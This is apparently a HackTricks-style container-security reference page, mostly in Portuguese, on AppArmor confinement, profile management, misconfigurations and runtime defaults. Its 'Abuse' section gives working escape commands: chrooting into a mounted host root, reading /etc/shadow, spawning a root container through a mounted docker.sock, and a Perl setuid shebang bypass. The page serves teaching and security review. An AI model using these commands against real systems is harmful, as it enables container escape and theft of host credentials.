# AppArmor

{{#include ../../../../banners/hacktricks-training.md}}

## Visão geral

AppArmor é um sistema de Controle de Acesso Obrigatório (Mandatory Access Control) que aplica restrições através de perfis por programa. Ao contrário das verificações tradicionais de DAC, que dependem fortemente da propriedade de usuário e grupo, o AppArmor permite que o kernel imponha uma política anexada ao próprio processo. Em ambientes de container, isso importa porque uma workload pode ter privilégios tradicionais suficientes para tentar uma ação e ainda assim ser negada porque seu perfil do AppArmor não permite o caminho, mount, comportamento de rede, ou uso de capability relevante.

O ponto conceitual mais importante é que o AppArmor é **path-based**. Ele raciocina sobre o acesso ao sistema de arquivos através de regras de caminho em vez de através de labels, como o SELinux faz. Isso o torna acessível e poderoso, mas também significa que bind mounts e layouts alternativos de caminho merecem atenção cuidadosa. Se o mesmo conteúdo do host se tornar alcançável sob um caminho diferente, o efeito da política pode não ser o que o operador esperava inicialmente.

## Papel no Isolamento de Containers

Revisões de segurança de containers frequentemente param em capabilities e seccomp, mas o AppArmor continua a ser relevante após essas checagens. Imagine um container que tem mais privilégio do que deveria, ou uma workload que precisou de uma capability extra por razões operacionais. O AppArmor ainda pode restringir o acesso a arquivos, comportamento de mount, rede e padrões de execução de maneiras que interrompem o caminho óbvio de abuso. Por isso desabilitar o AppArmor "apenas para fazer a aplicação funcionar" pode silenciosamente transformar uma configuração apenas arriscada em uma que é ativamente explorável.

## Laboratório

Para verificar se o AppArmor está ativo no host, use:
```bash
aa-status 2>/dev/null || apparmor_status 2>/dev/null
cat /sys/module/apparmor/parameters/enabled 2>/dev/null
```
Para ver sob qual usuário o processo atual do container está sendo executado:
```bash
docker run --rm ubuntu:24.04 cat /proc/self/attr/current
docker run --rm --security-opt apparmor=unconfined ubuntu:24.04 cat /proc/self/attr/current
```
A diferença é instrutiva. No caso normal, o processo deve mostrar um contexto AppArmor vinculado ao perfil escolhido pelo runtime. No caso unconfined, essa camada extra de restrição desaparece.

Você também pode inspecionar o que o Docker acha que aplicou:
```bash
docker inspect <container> | jq '.[0].AppArmorProfile'
```
## Uso em tempo de execução

Docker pode aplicar um perfil AppArmor padrão ou personalizado quando o host o suporta. Podman também pode integrar-se com AppArmor em sistemas baseados em AppArmor, embora em distribuições que priorizam o SELinux o outro sistema MAC frequentemente assuma maior importância. Kubernetes pode expor a política AppArmor ao nível da carga de trabalho em nós que realmente suportam AppArmor. LXC e ambientes de system-container da família Ubuntu também usam AppArmor extensivamente.

O ponto prático é que o AppArmor não é um "Docker feature". É um recurso do kernel do host que vários runtimes podem optar por aplicar. Se o host não o suporta ou se o runtime for instruído a rodar sem confinamento, a suposta proteção na prática não existe.

Em hosts AppArmor com suporte a Docker, o padrão mais conhecido é `docker-default`. Esse perfil é gerado a partir do template AppArmor do Moby e é importante porque explica por que alguns PoCs baseados em capability ainda falham em um container padrão. Em termos gerais, `docker-default` permite operações de rede normais, nega gravações em grande parte de `/proc`, nega acesso a partes sensíveis de `/sys`, bloqueia operações de mount e restringe ptrace para que este não seja uma primitiva geral de sondagem do host. Entender essa linha de base ajuda a distinguir "o container tem `CAP_SYS_ADMIN`" de "o container pode realmente usar essa capability contra as interfaces do kernel que me interessam".

## Gerenciamento de perfis

Os perfis do AppArmor geralmente são armazenados em `/etc/apparmor.d/`. Uma convenção comum de nomenclatura é substituir barras no caminho do executável por pontos. Por exemplo, um perfil para `/usr/bin/man` costuma ser armazenado como `/etc/apparmor.d/usr.bin.man`. Esse detalhe importa tanto na defesa quanto na avaliação, porque uma vez que você sabe o nome do perfil ativo, frequentemente pode localizar o arquivo correspondente rapidamente no host.

Comandos úteis de gerenciamento do lado do host incluem:
```bash
aa-status
aa-enforce
aa-complain
apparmor_parser
aa-genprof
aa-logprof
aa-mergeprof
```
A razão pela qual esses comandos importam em uma referência de container-security é que eles explicam como os perfis são realmente construídos, carregados, alternados para o complain mode e modificados após mudanças na aplicação. Se um operador tem o hábito de mover perfis para o complain mode durante o troubleshooting e esquecer de restaurar o enforcement, o container pode parecer protegido na documentação enquanto se comporta de forma muito mais permissiva na realidade.

### Construindo E Atualizando Perfis

`aa-genprof` pode observar o comportamento da aplicação e ajudar a gerar um perfil interativamente:
```bash
sudo aa-genprof /path/to/binary
/path/to/binary
```
`aa-easyprof` pode gerar um perfil modelo que depois pode ser carregado com `apparmor_parser`:
```bash
sudo aa-easyprof /path/to/binary
sudo apparmor_parser -a /etc/apparmor.d/path.to.binary
```
Quando o binário muda e a política precisa ser atualizada, `aa-logprof` pode reproduzir as negações encontradas nos logs e ajudar o operador a decidir se deve permiti-las ou negá-las:
```bash
sudo aa-logprof
```
### Logs

As negações do AppArmor costumam ficar visíveis no `auditd`, no syslog ou em ferramentas como o `aa-notify`:
```bash
sudo aa-notify -s 1 -v
```
Isto é útil operacionalmente e ofensivamente. Defensores usam isso para refinar perfis. Atacantes usam isso para descobrir qual caminho ou operação exata está sendo negada e se o AppArmor é o controle que está bloqueando uma cadeia de exploração.

### Identificando o arquivo de perfil exato

Quando um runtime mostra um nome de perfil AppArmor específico para um container, muitas vezes é útil mapear esse nome de volta para o arquivo de perfil no disco:
```bash
docker inspect <container> | grep AppArmorProfile
find /etc/apparmor.d/ -maxdepth 1 -name '*<profile-name>*' 2>/dev/null
```
This is especially useful during host-side review because it bridges the gap between "the container says it is running under profile `lowpriv`" and "the actual rules live in this specific file that can be audited or reloaded".

## Misconfigurations

O erro mais óbvio é `apparmor=unconfined`. Administradores frequentemente o definem enquanto depuram uma aplicação que falhou porque o profile bloqueou corretamente algo perigoso ou inesperado. Se a flag permanecer em produção, toda a camada MAC terá sido efetivamente removida.

Outro problema sutil é presumir que bind mounts são inofensivos porque as permissões de ficheiros parecem normais. Como AppArmor é path-based, expor host paths sob locais de montagem alternativos pode interagir mal com as regras de path. Um terceiro erro é esquecer que um nome de profile num config file significa muito pouco se o kernel do host não estiver realmente enforcing AppArmor.

## Abuse

Quando AppArmor não está presente, operações que antes eram restringidas podem subitamente funcionar: ler paths sensíveis através de bind mounts, aceder a partes de procfs ou sysfs que deveriam permanecer mais difíceis de usar, executar ações relacionadas com mount se capabilities/seccomp também o permitirem, ou usar paths que um profile normalmente negaria. AppArmor é frequentemente o mecanismo que explica porque uma tentativa de breakout baseada em capabilities "should work" on paper mas ainda falha na prática. Remova AppArmor, e a mesma tentativa pode começar a ter sucesso.

If you suspect AppArmor is the main thing stopping a path-traversal, bind-mount, or mount-based abuse chain, the first step is usually to compare what becomes accessible with and without a profile. For example, if a host path is mounted inside the container, start by checking whether you can traverse and read it:
```bash
cat /proc/self/attr/current
find /host -maxdepth 2 -ls 2>/dev/null | head
find /host/etc -maxdepth 1 -type f 2>/dev/null | head
```
Se o container também tiver uma capability perigosa, como `CAP_SYS_ADMIN`, um dos testes mais práticos é verificar se o AppArmor é o controle que está bloqueando operações de mount ou o acesso a sistemas de arquivos sensíveis do kernel:
```bash
capsh --print | grep cap_sys_admin
mount | head
mkdir -p /tmp/testmnt
mount -t proc proc /tmp/testmnt 2>/dev/null || echo "mount blocked"
mount -t tmpfs tmpfs /tmp/testmnt 2>/dev/null || echo "tmpfs blocked"
```
Em ambientes onde um caminho do host já está disponível através de um bind mount, a perda do AppArmor também pode transformar uma vulnerabilidade de divulgação de informação somente leitura em acesso direto a arquivos do host:
```bash
ls -la /host/root 2>/dev/null
cat /host/etc/shadow 2>/dev/null | head
find /host/var/run -maxdepth 2 -name '*.sock' 2>/dev/null
```
O objetivo desses comandos não é que o AppArmor por si só crie o breakout. O ponto é que, uma vez removido o AppArmor, muitos filesystem e mount-based abuse paths tornam-se testáveis imediatamente.

### Exemplo completo: AppArmor Disabled + Host Root Mounted

Se o container já tiver o host root bind-mounted em `/host`, remover o AppArmor pode transformar um blocked filesystem abuse path em uma host escape completa:
```bash
cat /proc/self/attr/current
ls -la /host
chroot /host /bin/bash 2>/dev/null || /host/bin/bash -p
```
Uma vez que o shell está executando através do sistema de arquivos do host, a carga de trabalho efetivamente escapou da fronteira do container:
```bash
id
hostname
cat /etc/shadow | head
```
### Exemplo Completo: AppArmor Desativado + Socket em tempo de execução

Se a verdadeira barreira fosse o AppArmor em torno do estado em tempo de execução, um socket montado pode ser suficiente para uma fuga completa:
```bash
find /host/run /host/var/run -maxdepth 2 -name docker.sock 2>/dev/null
docker -H unix:///host/var/run/docker.sock run --rm -it -v /:/mnt ubuntu chroot /mnt bash 2>/dev/null
```
O caminho exato depende do ponto de montagem, mas o resultado final é o mesmo: AppArmor não está mais impedindo o acesso à runtime API, e a runtime API pode iniciar um container que compromete o host.

### Exemplo completo: Path-Based Bind-Mount Bypass

Como AppArmor é baseado em caminhos, proteger `/proc/**` não protege automaticamente o mesmo conteúdo do procfs do host quando ele é acessível por um caminho diferente:
```bash
mount | grep '/host/proc'
find /host/proc/sys -maxdepth 3 -type f 2>/dev/null | head -n 20
cat /host/proc/sys/kernel/core_pattern 2>/dev/null
```
O impacto depende do que exatamente está montado e se o caminho alternativo também contorna outros controles, mas esse padrão é uma das razões mais evidentes pelas quais AppArmor deve ser avaliado junto com o mount layout em vez de isoladamente.

### Exemplo completo: Shebang Bypass

A política do AppArmor às vezes mira um caminho de interpretador de uma forma que não leva completamente em conta a execução de scripts via processamento do shebang. Um exemplo histórico envolveu usar um script cuja primeira linha aponta para um interpretador confinado:
```bash
cat <<'EOF' > /tmp/test.pl
#!/usr/bin/perl
use POSIX qw(setuid);
POSIX::setuid(0);
exec "/bin/sh";
EOF
chmod +x /tmp/test.pl
/tmp/test.pl
```
Esse tipo de exemplo é importante como lembrete de que a intenção do profile e a semântica real de execução podem divergir. Ao revisar AppArmor em ambientes de container, cadeias de intérpretes e caminhos alternativos de execução merecem atenção especial.

## Verificações

O objetivo dessas verificações é responder rapidamente a três perguntas: o AppArmor está habilitado no host, o processo atual está confinado, e o runtime realmente aplicou um profile a este container?
```bash
cat /proc/self/attr/current                         # Current AppArmor label for this process
aa-status 2>/dev/null                              # Host-wide AppArmor status and loaded/enforced profiles
docker inspect <container> | jq '.[0].AppArmorProfile'   # Profile the runtime says it applied
find /etc/apparmor.d -maxdepth 1 -type f 2>/dev/null | head -n 50   # Host-side profile inventory when visible
```
O que é interessante aqui:

- Se `/proc/self/attr/current` mostrar `unconfined`, a carga de trabalho não está se beneficiando do confinamento do AppArmor.
- Se `aa-status` mostrar AppArmor desabilitado ou não carregado, qualquer nome de perfil na configuração do runtime é em grande parte cosmético.
- Se `docker inspect` mostrar `unconfined` ou um perfil customizado inesperado, isso costuma ser a razão pela qual um caminho de abuso baseado em sistema de arquivos ou em montagem funciona.

Se um container já tem privilégios elevados por razões operacionais, deixar o AppArmor habilitado frequentemente faz a diferença entre uma exceção controlada e uma falha de segurança muito mais ampla.

## Padrões em tempo de execução

| Runtime / plataforma | Estado padrão | Comportamento padrão | Enfraquecimentos manuais comuns |
| --- | --- | --- | --- |
| Docker Engine | Ativado por padrão em hosts com suporte a AppArmor | Usa o perfil AppArmor `docker-default` a menos que seja substituído | `--security-opt apparmor=unconfined`, `--security-opt apparmor=<profile>`, `--privileged` |
| Podman | Depende do host | O AppArmor é suportado via `--security-opt`, mas o padrão exato depende do host/runtime e é menos universal do que o perfil `docker-default` documentado do Docker | `--security-opt apparmor=unconfined`, `--security-opt apparmor=<profile>`, `--privileged` |
| Kubernetes | Padrão condicional | Se `appArmorProfile.type` não for especificado, o padrão é `RuntimeDefault`, mas ele só é aplicado quando AppArmor está habilitado no nó | `securityContext.appArmorProfile.type: Unconfined`, `securityContext.appArmorProfile.type: Localhost` com um perfil fraco, nós sem suporte ao AppArmor |
| containerd / CRI-O under Kubernetes | Depende do suporte do nó/runtime | Runtimes comumente suportados pelo Kubernetes oferecem suporte ao AppArmor, mas a aplicação real ainda depende do suporte do nó e das configurações da carga de trabalho | Mesmo que a linha do Kubernetes; a configuração direta do runtime também pode ignorar completamente o AppArmor |

Para o AppArmor, a variável mais importante costuma ser o **host**, não apenas o runtime. Uma configuração de perfil em um manifesto não cria confinamento em um nó onde o AppArmor não está habilitado.
{{#include ../../../../banners/hacktricks-training.md}}
